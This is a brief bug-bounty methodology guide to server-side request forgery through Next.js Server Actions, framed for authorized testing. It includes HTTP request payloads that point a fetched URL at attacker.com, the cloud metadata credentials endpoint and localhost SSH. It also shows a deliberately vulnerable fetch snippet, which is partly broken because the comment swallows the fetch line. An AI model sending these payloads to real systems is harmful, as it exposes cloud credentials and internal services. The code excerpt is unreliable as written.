# SSRF via Next.js Server Actions

## When to Use
- When auditing modern web applications built using Next.js (React framework) that utilize Server Actions or custom API routes (`/pages/api` or `/app/api`).
- To demonstrate how fetching external data based on user input on the server side can lead to SSRF, allowing access to internal networks or cloud metadata.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Identifying Server Actions

```text
# Concept: Next.js Server Actions ```

### Phase 2: Analyzing Request Payloads (Black Box)

```http
# POST / HTTP/1.1
Host: target.com
Content-Type: text/plain;charset=UTF-8
Next-Action: xxxxxxxx

[{"url": "https://attacker.com/image.png"}]
```

### Phase 3: Code Review (White Box - if available)

```javascript
# Sink: fetch() 'use server'

export async function fetchPreview(url) {
  // VULNERABLE const res = await fetch(url);
  const data = await res.text();
  return { preview: data.substring(0, 100) };
}
```

### Phase 4: Exploitation

```http
# POST / HTTP/1.1
Host: target.com
Content-Type: text/plain;charset=UTF-8
Next-Action: xxxxxxxx

[{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}]

# POST / HTTP/1.1
Host: target.com
Content-Type: text/plain;charset=UTF-8
Next-Action: xxxxxxxx

[{"url": "http://127.0.0.1:22"}]
```
